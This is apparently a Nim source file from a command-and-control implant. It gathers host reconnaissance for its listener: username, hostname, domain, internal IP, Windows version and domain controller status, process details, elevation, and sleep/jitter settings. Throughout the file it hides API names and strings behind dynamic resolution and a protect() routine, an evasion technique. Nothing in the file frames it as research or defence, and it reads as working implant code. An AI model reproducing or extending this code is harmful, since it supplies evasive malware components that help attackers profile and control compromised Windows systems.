import winim/lean
import os, strutils, strformat

import ../../../common/[crypto, utils]
import ../../../types/[common, agent, protocol]

const MODULES* {.intdefine.} = 0

const
    CNLEN = 15    # Maximum computer name length 
    UNLEN = 256   # Maximum user name length 

type
    RtlGetVersion = proc(versionInfo: ptr OSVERSIONINFOEXW): NTSTATUS {.stdcall.}
    NtOpenProcessToken = proc(processHandle: HANDLE, desiredAccess: ACCESS_MASK, tokenHandle: PHANDLE): NTSTATUS {.stdcall.}
    NtQueryInformationToken = proc(hToken: HANDLE, tokenInformationClass: TOKEN_INFORMATION_CLASS, tokenInformation: PVOID, tokenInformationLength: ULONG, returnLength: PULONG): NTSTATUS {.stdcall.}
    NtClose = proc(handle: HANDLE): NTSTATUS {.stdcall.}
    GetUserNameExW = proc(nameFormat: int32, lpNameBuffer: LPWSTR, nSize: ptr ULONG): BOOL {.stdcall.}
    GetUserNameW = proc(lpBuffer: LPWSTR, pcbBuffer: LPDWORD): BOOL {.stdcall.}
    RegOpenKeyExW = proc(hKey: HKEY, lpSubKey: LPCWSTR, ulOptions: DWORD, samDesired: DWORD, phkResult: ptr HKEY): LONG {.stdcall.}
    RegQueryValueExW = proc(hKey: HKEY, lpValueName: LPCWSTR, lpReserved: LPDWORD, lpType: LPDWORD, lpData: LPBYTE, lpcbData: LPDWORD): LONG {.stdcall.}
    RegCloseKey = proc(hKey: HKEY): LONG {.stdcall.}

    # IPv4 address retrieval
    SockAddrIn = object
        sin_family: uint16
        sin_port: uint16
        sin_addr: uint32
        sin_zero: array[8, char]

    WSAStartup = proc(wVersionRequired: WORD, wsaData: ptr array[400, byte]): int32 {.stdcall.}
    WSACleanup = proc(): int32 {.stdcall.}
    WsaSocket = proc(af: int32, socktype: int32, protocol: int32): uint {.stdcall.}
    WsaConnect = proc(s: uint, name: ptr SockAddrIn, namelen: int32): int32 {.stdcall.}
    WsaGetsockname = proc(s: uint, name: ptr SockAddrIn, namelen: ptr int32): int32 {.stdcall.}
    WsaClosesocket = proc(s: uint): int32 {.stdcall.}
    InetNtoa = proc(inAddr: uint32): cstring {.stdcall.}

type
    # Windows Version fingerprinting
    ProductType* {.size: sizeof(uint8).} = enum
        UNKNOWN = "Unknown"
        WORKSTATION = "Workstation"
        DC = "Domain Controller"
        SERVER = "Server"

    WindowsVersion = object
        major: DWORD
        minor: DWORD
        buildMin: DWORD  
        buildMax: DWORD  
        productType: ProductType
        name: string

# Hostname/Computername
proc getHostname*(): string =
    var
        buffer = newWString(CNLEN + 1)
        dwSize = DWORD buffer.len

    GetComputerNameW(&buffer, &dwSize)
    return $buffer[0 ..< int(dwSize)]

# Domain Name
proc getDomain*(): string =
    const ComputerNameDnsDomain = cast[COMPUTER_NAME_FORMAT](2) # COMPUTER_NAME_FORMAT (https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/ne-sysinfoapi-computer_name_format)
    var
        buffer = newWString(UNLEN + 1)
        dwSize = DWORD buffer.len

    GetComputerNameExW(ComputerNameDnsDomain, &buffer, &dwSize)
    return $buffer[0 ..< int(dwSize)]

# Username
proc getUsername*(): string =
    const NameSamCompatible = 2.int32 # EXTENDED_NAME_FORMAT (https://learn.microsoft.com/de-de/windows/win32/api/secext/ne-secext-extended_name_format)

    let pGetUserNameExW = cast[GetUserNameExW](GetProcAddress(LoadLibraryA(protect("secur32.dll")), protect("GetUserNameExW")))
    let pGetUserNameW = cast[GetUserNameW](GetProcAddress(GetModuleHandleA(protect("advapi32.dll")), protect("GetUserNameW")))

    var buffer = newWString(UNLEN + 1)

    if getDomain() != "":
        # If domain-joined, return username in format DOMAIN\USERNAME
        var dwSize = ULONG(buffer.len)
        discard pGetUserNameExW(NameSamCompatible, &buffer, addr dwSize)
        return $buffer[0 ..< int(dwSize)]
    else:
        # If not domain-joined, only return USERNAME
        var dwSize = DWORD(buffer.len)
        discard pGetUserNameW(&buffer, addr dwSize)
        return $buffer[0 ..< int(dwSize) - 1]


# Current process name
proc getProcessExe*(): string =
    let buffer = newWString(MAX_PATH + 1)
    let length = GetModuleFileNameW(0, buffer, MAX_PATH)
    if length == 0: return ""
    return ($buffer[0 ..< int(length)]).extractFilename()

# Current process ID
proc getProcessId*(): int =
    return int(GetCurrentProcessId())

# Current process elevation/integrity level
proc isElevated*(): bool =
    let 
        hNtdll = GetModuleHandleA(protect("ntdll"))
        pNtOpenProcessToken = cast[NtOpenProcessToken](GetProcAddress(hNtdll, protect("NtOpenProcessToken")))
        pNtQueryInformationToken = cast[NtQueryInformationToken](GetProcAddress(hNtdll, protect("NtQueryInformationToken")))
        pNtClose = cast[NtClose](GetProcAddress(hNtdll, protect("NtClose")))

    var hToken: HANDLE = 0
    if pNtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, addr hToken) != STATUS_SUCCESS:
        return false

    const TokenElevation = cast[TOKEN_INFORMATION_CLASS](20)
    var elevation: DWORD = 0
    var returnLength: ULONG = 0
    let elevated = pNtQueryInformationToken(hToken, TokenElevation, cast[PVOID](addr elevation), ULONG(sizeof(DWORD)), addr returnLength) == STATUS_SUCCESS and elevation != 0
    discard pNtClose(hToken)
    return elevated

# Primary IPv4 Address (Internal)
proc getIPv4Address*(): string =
    const
        AF_INET = 2.int32
        SOCK_DGRAM = 2.int32
        IPPROTO_UDP = 17.int32
        INVALID_SOCKET = high(uint)
        WINSOCK_VERSION = 0x0202.WORD
        REMOTE_ADDR = 0x08080808.uint32  # 8.8.8.8 in network byte order
        REMOTE_PORT = 0x5000.uint16      # port 80 in network byte order

    let 
        hWs2 = LoadLibraryA(protect("ws2_32.dll"))
        pWSAStartup = cast[WSAStartup](GetProcAddress(hWs2, protect("WSAStartup")))
        pWSACleanup = cast[WSACleanup](GetProcAddress(hWs2, protect("WSACleanup")))
        pSocket = cast[WsaSocket](GetProcAddress(hWs2, protect("socket")))
        pConnect = cast[WsaConnect](GetProcAddress(hWs2, protect("connect")))
        pGetsockname = cast[WsaGetsockname](GetProcAddress(hWs2, protect("getsockname")))
        pClosesocket = cast[WsaClosesocket](GetProcAddress(hWs2, protect("closesocket")))
        pInetNtoa = cast[InetNtoa](GetProcAddress(hWs2, protect("inet_ntoa")))

    var wsaData: array[400, byte]
    if pWSAStartup(WINSOCK_VERSION, addr wsaData) != 0: 
        return ""
    defer: discard pWSACleanup()

    let sock = pSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
    if sock == INVALID_SOCKET: 
        return ""
    defer: discard pClosesocket(sock)

    var dest = SockAddrIn(sin_family: uint16(AF_INET), sin_port: REMOTE_PORT, sin_addr: REMOTE_ADDR)
    if pConnect(sock, addr dest, sizeof(SockAddrIn).int32) != 0: 
        return ""

    var local = SockAddrIn()
    var localLen = sizeof(SockAddrIn).int32
    if pGetsockname(sock, addr local, addr localLen) != 0: 
        return ""

    return $pInetNtoa(local.sin_addr)

let versions = [
    # Windows 11 / Server 2022+
    # WindowsVersion(major: 10, minor: 0, buildMin: 22631, buildMax: 0, productType: WORKSTATION, name: protect("Windows 11 23H2")),
    # WindowsVersion(major: 10, minor: 0, buildMin: 22621, buildMax: 22630, productType: WORKSTATION, name: protect("Windows 11 22H2")),
    WindowsVersion(major: 10, minor: 0, buildMin: 22000, buildMax: 0, productType: WORKSTATION, name: protect("Windows 11")),
    WindowsVersion(major: 10, minor: 0, buildMin: 26100, buildMax: 0, productType: SERVER, name: protect("Windows Server 2025")),
    WindowsVersion(major: 10, minor: 0, buildMin: 20348, buildMax: 26099, productType: SERVER, name: protect("Windows Server 2022")),

    # Windows 10 / Server 2016-2019
    WindowsVersion(major: 10, minor: 0, buildMin: 19041, buildMax: 19045, productType: WORKSTATION, name: protect("Windows 10 2004/20H2/21H1/21H2/22H2")),
    WindowsVersion(major: 10, minor: 0, buildMin: 17763, buildMax: 19040, productType: WORKSTATION, name: protect("Windows 10 1809+")),
    WindowsVersion(major: 10, minor: 0, buildMin: 10240, buildMax: 17762, productType: WORKSTATION, name: protect("Windows 10")),
    WindowsVersion(major: 10, minor: 0, buildMin: 17763, buildMax: 17763, productType: SERVER, name: protect("Windows Server 2019")),
    WindowsVersion(major: 10, minor: 0, buildMin: 14393, buildMax: 14393, productType: SERVER, name: protect("Windows Server 2016")),
    WindowsVersion(major: 10, minor: 0, buildMin: 0, buildMax: 0, productType: SERVER, name: protect("Windows Server (Unknown Build)")),

    # Windows 8.x / Server 2012
    WindowsVersion(major: 6, minor: 3, buildMin: 0, buildMax: 0, productType: WORKSTATION, name: protect("Windows 8.1")),
    WindowsVersion(major: 6, minor: 3, buildMin: 0, buildMax: 0, productType: SERVER, name: protect("Windows Server 2012 R2")),
    WindowsVersion(major: 6, minor: 2, buildMin: 0, buildMax: 0, productType: WORKSTATION, name: protect("Windows 8")),
    WindowsVersion(major: 6, minor: 2, buildMin: 0, buildMax: 0, productType: SERVER, name: protect("Windows Server 2012")),

    # Windows 7 / Server 2008 R2
    WindowsVersion(major: 6, minor: 1, buildMin: 0, buildMax: 0, productType: WORKSTATION, name: protect("Windows 7")),
    WindowsVersion(major: 6, minor: 1, buildMin: 0, buildMax: 0, productType: SERVER, name: protect("Windows Server 2008 R2")),

    # Windows Vista / Server 2008
    WindowsVersion(major: 6, minor: 0, buildMin: 0, buildMax: 0, productType: WORKSTATION, name: protect("Windows Vista")),
    WindowsVersion(major: 6, minor: 0, buildMin: 0, buildMax: 0, productType: SERVER, name: protect("Windows Server 2008")),

    # Windows XP / Server 2003
    WindowsVersion(major: 5, minor: 2, buildMin: 0, buildMax: 0, productType: WORKSTATION, name: protect("Windows XP x64 Edition")),
    WindowsVersion(major: 5, minor: 2, buildMin: 0, buildMax: 0, productType: SERVER, name: protect("Windows Server 2003")),
    WindowsVersion(major: 5, minor: 1, buildMin: 0, buildMax: 0, productType: WORKSTATION, name: protect("Windows XP")),
]

proc matchVersion*(version: WindowsVersion, info: OSVERSIONINFOEXW, productType: ProductType): bool =
    if info.dwMajorVersion != version.major or info.dwMinorVersion != version.minor:
        return false
    if productType != version.productType:
        return false
    if version.buildMin > 0 and info.dwBuildNumber < version.buildMin:
        return false
    if version.buildMax > 0 and info.dwBuildNumber > version.buildMax:
        return false
    return true

proc getWindowsVersion*(info: OSVERSIONINFOEXW, productType: ProductType): string =
    for version in versions:
        if version.matchVersion(info, if productType == DC: SERVER else: productType): # Process domain controllers as servers, otherwise they show up as unknown
            if productType == DC:
                return version.name & protect(" (Domain Controller)")
            else:
                return version.name

    # Unknown windows version, return as much information as possible
    return fmt"Windows {$int(info.dwMajorVersion)}.{$int(info.dwMinorVersion)} {$productType} (Build: {$int(info.dwBuildNumber)})"

proc getProductType*(): ProductType =
    # The product key is retrieved from the registry
    # HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions
    #   ProductType    REG_SZ    WinNT
    # Possible values are:
    #   LanmanNT -> Server/Domain Controller
    #   ServerNT -> Server
    #   WinNT    -> Workstation

    let 
        hAdvapi32 = GetModuleHandleA(protect("advapi32.dll"))
        pRegOpenKeyExW = cast[RegOpenKeyExW](GetProcAddress(hAdvapi32, protect("RegOpenKeyExW")))
        pRegQueryValueExW = cast[RegQueryValueExW](GetProcAddress(hAdvapi32, protect("RegQueryValueExW")))
        pRegCloseKey = cast[RegCloseKey](GetProcAddress(hAdvapi32, protect("RegCloseKey")))

    const KEY_READ = 0x20019.DWORD
    var hKey: HKEY
    let subKey = newWideCString(protect("SYSTEM\\CurrentControlSet\\Control\\ProductOptions"))
    if pRegOpenKeyExW(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ, addr hKey) != 0:
        return UNKNOWN
    defer: discard pRegCloseKey(hKey)

    var dataSize = DWORD(64 * sizeof(WCHAR))
    var dataType: DWORD = 0
    let buffer = newWString(64)
    let valueName = newWideCString(protect("ProductType"))
    if pRegQueryValueExW(hKey, valueName, nil, addr dataType, cast[LPBYTE](&buffer), addr dataSize) != 0:
        return UNKNOWN

    let charCount = int(dataSize) div sizeof(WCHAR) - 1
    let value = $buffer[0 ..< charCount]
    case value
    of protect("WinNT"): return WORKSTATION
    of protect("ServerNT"): return SERVER
    of protect("LanmanNT"): return DC
    else: return UNKNOWN

proc getOSVersion*(): string =
    let pRtlGetVersion = cast[RtlGetVersion](GetProcAddress(GetModuleHandleA(protect("ntdll")), protect("RtlGetVersion")))

    when defined(windows):
        var osInfo: OSVERSIONINFOEXW
        osInfo.dwOSVersionInfoSize = DWORD(sizeof(OSVERSIONINFOEXW))
        discard pRtlGetVersion(addr osInfo)

        # RtlGetVersion does not actually set the Product Type, which is required to differentiate
        # between workstation and server systems. The value is set to 0, which would lead to all systems being "unknown"
        # Normally, a value of 1 indicates a workstation os, while other values represent servers

        # We instead retrieve the product type from the registry
        return getWindowsVersion(osInfo, getProductType())
    else:
        return protect("Unknown")

proc collectAgentMetadata*(ctx: AgentCtx): AgentMetadata =
    return AgentMetadata(
        listenerId: string.toUuid(ctx.transport.listenerId),
        username: string.toBytes(getUsername()),
        hostname: string.toBytes(getHostname()),
        domain: string.toBytes(getDomain()),
        ip: string.toBytes(getIPv4Address()),
        os: string.toBytes(getOSVersion()),
        process: string.toBytes(getProcessExe()),
        pid: cast[uint32](getProcessId()),
        isElevated: cast[uint8](isElevated()),
        sleep: cast[uint32](ctx.sleepSettings.sleepDelay),
        jitter: cast[uint32](ctx.sleepSettings.jitter),
        modules: cast[uint32](MODULES)
    )
